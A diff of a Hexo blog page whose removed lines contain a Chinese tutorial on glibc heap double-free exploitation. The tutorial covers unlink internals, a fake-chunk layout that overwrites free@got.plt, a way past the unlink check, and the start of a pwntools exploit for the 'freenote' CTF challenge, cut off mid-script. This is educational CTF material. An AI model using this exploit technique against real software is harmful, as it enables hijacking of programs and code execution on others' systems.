@@ -2,9 +2,10 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.0">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.1.0">
+
+
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -13,14 +14,13 @@
 <link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
 
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-  <meta name="description" content="0x00.　前言很久之前学习了Linux堆漏洞Double free，一直没时间写下学习体会。今天有时间记录下，如有错误，欢迎斧正。本文主要介绍Linux下堆漏洞Double free的利用原理与实践。所谓的Double free是指：同一个指针指向的内存被free两次。 0x01.　Glibc背景知识Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块">
+<script class="next-config" data-name="main" type="application/json">{"hostname":"yoursite.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.11.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x00.　前言很久之前学习了Linux堆漏洞Double free，一直没时间写下学习体会。今天有时间记录下，如有错误，欢迎斧正。本文主要介绍Linux下堆漏洞Double free的利用原理与实践。所谓的Double free是指：同一个指针指向的内存被free两次。 0x01.　Glibc背景知识Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Linux堆漏洞之Double free">
 <meta property="og:url" content="http://yoursite.com/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/index.html">
@@ -33,72 +33,46 @@
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
 
+
 <link rel="canonical" href="http://yoursite.com/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/">
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh-CN'
-  };
-</script>
 
-  <title>Linux堆漏洞之Double free | 不要说话</title>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://yoursite.com/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/","path":"2017/02/24/PWN/Linux堆漏洞之Double-free/","title":"Linux堆漏洞之Double free"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Linux堆漏洞之Double free | 不要说话</title>
   
 
 
 
 
 
-
   <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
 
+  <main class="main">
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
   <div class="site-meta">
 
     <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">不要说话</h1>
-      <span class="logo-line-after"><i></i></span>
+      <i class="logo-line"></i>
+      <p class="site-title">不要说话</p>
+      <i class="logo-line"></i>
     </a>
   </div>
 
@@ -110,29 +84,8 @@
 
 
 
-
 <nav class="site-nav">
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
-
-  </li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
   </ul>
 </nav>
 
@@ -140,176 +93,18 @@
 
 
 </div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="D0m021ng">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="不要说话">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          Linux堆漏洞之Double free
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2017-02-24 11:19:12" itemprop="dateCreated datePublished" datetime="2017-02-24T11:19:12+00:00">2017-02-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2017-03-02 00:47:16" itemprop="dateModified" datetime="2017-03-02T00:47:16+00:00">2017-03-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.　前言"></a>0x00.　前言</h3><p>很久之前学习了Linux堆漏洞Double free，一直没时间写下学习体会。今天有时间记录下，如有错误，欢迎斧正。本文主要介绍Linux下堆漏洞Double free的利用原理与实践。所谓的Double free是指：同一个指针指向的内存被free两次。</p>
-<h3 id="0x01-Glibc背景知识"><a href="#0x01-Glibc背景知识" class="headerlink" title="0x01.　Glibc背景知识"></a>0x01.　Glibc背景知识</h3><p>Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块的显式链表（Glibc中的bins数据结构）。关于bins的介绍已经有很多，就不赘述了。接下来介绍一下Linux下Double free漏洞原理以及free函数的堆块合并过程。</p>
-<p><strong>Double free漏洞原理：</strong> free函数在释放堆块时，会通过隐式链表判断相邻前、后堆块是否为空闲堆块；如果堆块为空闲就会进行合并，然后利用Unlink机制将该空闲堆块从Unsorted bin中取下。如果用户精心构造的假堆块被Unlink，很容易导致一次固定地址写，然后转换为任意地址读写，从而控制程序的执行。</p>
-<p><strong>Linux free函数原理</strong><br>由堆块头部形成的隐式链表可知，一个需释放堆块相邻的堆块有两个：<em>前一个块</em>（由当前块头指针加pre_size确定），<em>后一个块</em>（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：<em>向后合并</em>、<em>向前合并</em>。当前一个块和当前块合并时，叫做向后合并。当后一个块和当前块合并时，叫做向前合并。<br><em>相关代码</em><br>    malloc.c int_free函数中相关代码如下：<br>    <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char \*) (p)) + (s)))</span></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> \*) (p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br><span class="line"></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">/* consolidate backward \*/</span>                    <span class="comment">// &quot;向后合并&quot;</span></span><br><span class="line">     <span class="keyword">if</span> (!prev_inuse(p)) &#123;                           <span class="comment">//如果前一个块为空闲，则进行合并</span></span><br><span class="line">       prevsize = p-&gt;prev_size;                      <span class="comment">//获得前一个块大小</span></span><br><span class="line">       size += prevsize;                             <span class="comment">//合并后堆块大小</span></span><br><span class="line">       p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));   <span class="comment">//根据当前块指针和前一个块大小，确定前一个块位置，即合并后块位置</span></span><br><span class="line">       unlink(av, p, bck, fwd);                      <span class="comment">//利用unlink从显式链表Unsorted bin取下前一个块</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      nextchunk = chunk_at_offset(p, size);                 <span class="comment">//根据当前块指针和当前块大小， 确定后一个块位置，</span></span><br><span class="line">      nextsize = chunksize(nextchunk);                      <span class="comment">//获得后一个块大小</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">//根据下一个块的下一个块的PREV_INUSE位，判断下一个块是否空闲</span></span><br><span class="line">      <span class="comment">/* consolidate forward \*/</span>                <span class="comment">// &quot;向前合并&quot;</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123;                          <span class="comment">//如果后一个块为空闲，则进行合并</span></span><br><span class="line">       unlink(av, nextchunk, bck, fwd);         <span class="comment">//使用unlink将后一个块从unsorted bin中取下</span></span><br><span class="line">       size += nextsize;                        <span class="comment">//扩大当前块大小即可完成向前合并</span></span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">     clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  unlink 宏中主要的操作如下:</span><br><span class="line">  注意：此处的fd、bk指的是显式链表bins中的前一个块和后一个块，与合并块时的隐式链表中的前一个块和后一个块不同</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">      FD = P-&gt;fd;   <span class="comment">//获取显式链表中前一个块 FD					      </span></span><br><span class="line">      BK = P-&gt;bk;   <span class="comment">//获取显示链表中后一个块 BK              </span></span><br><span class="line">      FD-&gt;bk = BK;  <span class="comment">//设置FD的后一个块					      </span></span><br><span class="line">      BK-&gt;fd = FD;  <span class="comment">//设置BK的前一个块</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//由于unlink的危险性，添加了一些检测机制，完整版unlink宏如下</span></span><br><span class="line">  <span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">      FD = P-&gt;fd;								      \</span><br><span class="line">      BK = P-&gt;bk;								      </span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line">      <span class="keyword">else</span> &#123;								      \</span><br><span class="line">          FD-&gt;bk = BK;							      \</span><br><span class="line">          BK-&gt;fd = FD;							      \</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span><br><span class="line">              &amp;&amp;__builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      \</span><br><span class="line">  	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      \</span><br><span class="line">  		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">  	      malloc_printerr (check_action,				      \</span><br><span class="line">  			       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">  			       P, AV);					      \</span><br><span class="line">              <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      \</span><br><span class="line">                  <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                  <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                      FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                      FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                      P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                      P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                    &#125;							      \</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                  P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                  P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">                &#125;								      \</span><br><span class="line">            &#125;								      \</span><br><span class="line">        &#125;									      \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
-<h3 id="0x02-Double-free漏洞利用原理"><a href="#0x02-Double-free漏洞利用原理" class="headerlink" title="0x02.　Double free漏洞利用原理"></a>0x02.　Double free漏洞利用原理</h3><p>以64位应用为例：如果在free一个指针指向的块时，由于堆溢出，将后一个块的块头改成如下格式:<br> <strong>fake_prevsize1 = 被释放块大小；</strong><br> <strong>fake_size1 = 0x20 | 1  (fake_size1 = 0x20)</strong><br> <strong>fake_fd = <a href="mailto:free@got.plt">free@got.plt</a> - 0x18</strong><br> <strong>fake_bk = shellcode address</strong><br> <strong>fake_prevsize2 = 0x20</strong><br> <strong>fake_size2 = 0x10</strong><br>如下图:<br><strong>如果chunk0被释放(fake_size1 = 0x21)，进行空闲块合并时，1）由于前一个块非空闲，不会向后合并。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。</strong><br><strong>如果chunk1被释放(fake_size1 = 0x20)，进行空闲块合并时，1）由于前一个块空闲，向后合并,导致unlink。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。</strong><br><strong>根据unlink宏知道</strong>， 前一个块 FD 指向 <a href="mailto:free@got.plt">free@got.plt</a> - 0x18, 后一个块 BK 指向 shellcode address。然后前一个块 FD 的bk指针即<a href="mailto:free@got.plt">free@got.plt</a>，值为shellcode address, 后一个块 BK 的 fd 指针即shellcode + 0x10，值为 <a href="mailto:free@got.plt">free@got.plt</a>。从而实现了一次固定地址写。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">High    |----------------|</span><br><span class="line">        |   fake_size2   |</span><br><span class="line">        |----------------|</span><br><span class="line">        | fake_prevsize2 |</span><br><span class="line">        |----------------|  chunk2 pointer</span><br><span class="line">        |    fake_bk     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_fd     |</span><br><span class="line">        |----------------|  chunk1 <span class="built_in">malloc</span> returned pointer</span><br><span class="line">        |  fake_size1    |</span><br><span class="line">        |----------------|</span><br><span class="line">        | fake_prevsize1 |</span><br><span class="line">        |----------------|  chunk1 pointer</span><br><span class="line">        |     ......     |</span><br><span class="line">        |    padding     |</span><br><span class="line">        |     ......     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_bk     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_fd     |</span><br><span class="line">        |----------------|  chunk0 <span class="built_in">malloc</span> returned pointer</span><br><span class="line">        |     size       |</span><br><span class="line">        |----------------|</span><br><span class="line">        |   prev_size    |</span><br><span class="line">Low     |----------------|  chunk0 pointer</span><br></pre></td></tr></table></figure>
-<p>但是，由于当前glibc的加固检测机制，会检查显式链表中前一个块的fd与后一个块的bk是否都指向当前需要unlink的块。这样攻击者就无法替换chunk1(或chunk0)的fd与bk。相关代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">   malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV)</span><br></pre></td></tr></table></figure><br>针对这种情况，需要在内存中找到一个指向需要unlink块的指针，就可以绕过。</p>
-<h3 id="0x03-Double-free漏洞利用实例"><a href="#0x03-Double-free漏洞利用实例" class="headerlink" title="0x03.　Double free漏洞利用实例"></a>0x03.　Double free漏洞利用实例</h3><p>下面以64位的freenote为例，介绍下Double free漏洞的利用。<br>该freenote存在两个漏洞：一个是在建立新note的时候在note的结尾处没有加”\x00”,因此会造成堆栈地址泄露;另一个漏洞就是在delete note时，没有检测这个note是否已经被删除过了，可以删除一个note两遍，造成double free。<br><strong>利用思路：</strong><br>(1) 泄漏libc.so地址，通过新建两个note，然后删除一个note，再新建一个note，泄漏glibc中main_arena.top的地址，然后根据偏移计算其他地址。<br>(2) 泄漏heap地址，让某个非使用中chunk的fd栏位指向另一个 chunk，并且让note的内容拼接上，就可以把chunk在堆上的位置给泄漏出来。<br>(3) 触发unlink机制，并布置参数，导致一次固定地址写。由于申请的堆长度和地址放在bss段，因此可以将fake_fd地址指向 bss第一个堆基址 - 0x18，fake_bk地址指向 bss第一个堆基址 - 0x10，就可以绕过unlink检测机制。<br>(4) 对任意地址读写，覆盖<a href="mailto:free@got.plt">free@got.plt</a>为system地址。<br><strong>漏洞利用代码：</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="comment"># context.log_level =&#x27;debug&#x27;</span></span><br><span class="line">    p = process(<span class="string">&#x27;./freenote_x64&#x27;</span>)</span><br><span class="line">    gdb.attach(p, <span class="string">&#x27;b *0x40106a \n b *0x400edc&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># context.log_level =&#x27;debug&#x27;</span></span><br><span class="line">    p = remote(<span class="string">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="number">9886</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_post</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_post</span>(<span class="params">l, c</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;new note: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(l))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your note: &#x27;</span>)</span><br><span class="line">    p.sendline(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_post</span>(<span class="params">n, l, c</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)    </span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note number: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(n))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Length of note: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(l))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your note: &#x27;</span>)</span><br><span class="line">    p.sendline(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_post</span>(<span class="params">n</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note number: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    free_got = <span 